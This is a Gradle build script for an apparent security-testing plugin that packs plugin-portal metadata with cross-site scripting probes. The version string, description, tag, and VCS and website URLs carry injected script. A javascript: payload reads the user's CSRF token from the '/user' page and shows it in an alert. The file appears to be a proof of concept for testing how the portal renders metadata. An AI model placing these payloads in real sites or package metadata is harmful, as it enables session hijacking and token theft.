import com.gradle.publish.PublishPlugin
import com.gradle.publish.PublishTask

plugins {
    java
    id("org.jlleitschuh.plugin-publish")
    id("java-gradle-plugin")
}


group = "org.jlleitschuh.testing.security"
val versionBase = "0.4.42"
val versionExtension = ""
val xxsExploitVersion = "\"onmouseover=alert(32)"
val customVersion = "$versionBase-$versionExtension-SNAPSHOT-a"
version = customVersion

repositories {
    gradlePluginPortal()
}

dependencies {
    compile(gradleApi())
    compile("com.gradle.plugin-publish:com.gradle.plugin-publish.gradle.plugin:0.9.10")
}

configurations {
    "archives" {
        outgoing {
            artifact(file("src/main/web/index.html"))
        }
    }
}


gradlePlugin {
    (plugins) {
        "securityPlugin" {
            id = "org.jlleitschuh.testing.security-plugin"
            implementationClass = "org.jlleitschuh.testing.security.SecurityPlugin"
        }
    }
}

val descriptionFull = """
Useless security testing. <script>alert(\"Testing if this works\")</script>.
Can links be rendered?
[Test](https://gradle.com)
<a href="https://gradle.com">Test</a>
""".trimIndent()

tasks.withType<Javadoc>().configureEach {
    isFailOnError = false
}

val CSRF_TOKEN_EXTRACTION_JAVASCRIPT = """
var x = new XMLHttpRequest();
x.open( "GET", "/user", false );
x.send( null );
var l = x.responseText.split(/\r?\n/).filter(function(x) { return x.includes("csrfToken")});
alert("CSRF Token:" + l[0].substring(l[0].lastIndexOf("value=\"") + 7, l[0].lastIndexOf("\"")));
""".trimIndent().replace("\n", "").replace("  ", "")
println(CSRF_TOKEN_EXTRACTION_JAVASCRIPT)
val CSRF_MINIFIED =
    "var x=new XMLHttpRequest;x.open(\"GET\",\"/user\",!1),x.send(null);var l=x.responseText.split(/\\r?\\n/).filter(function(e){return e.includes(\"csrfToken\")});alert(\"CSRF Token:\"+l[0].substring(l[0].lastIndexOf('value=\"')+7,l[0].lastIndexOf('\"')));"
val javascript_CSRF = "javascript:$CSRF_MINIFIED"

val simplifiedXss = "javascript:function httpGet(e){var n=new XMLHttpRequest;return n.open(\"GET\",e,!1),n.send(null),n.responseText}alert(\"Cross site scripting in vcs.\")"
val vcsUrlTest = "javascript:alert( \"Cross site scripting in vcs.\")"
val websiteUrlTest = "javascript:alert( \"Cross site scripting in website url.\")"
val xssTag = "javascript:alert(\"Cross site scripting in tag.\")"

pluginBundle {
    description = "Some description"

    vcsUrl = javascript_CSRF
    website = javascript_CSRF
    tags = listOf("dont-use", "really-dont-use", "gradle", "plugin", xssTag)

    (plugins) {
        "securityPlugin" {
            id = "org.jlleitschuh.testing.security-plugin"
            displayName = "Security testing plugin"
        }
    }
}

// Keep this at the bottom of this file.
tasks.withType<Wrapper>().configureEach {
    gradleVersion = "4.9"
    distributionType = Wrapper.DistributionType.ALL
}
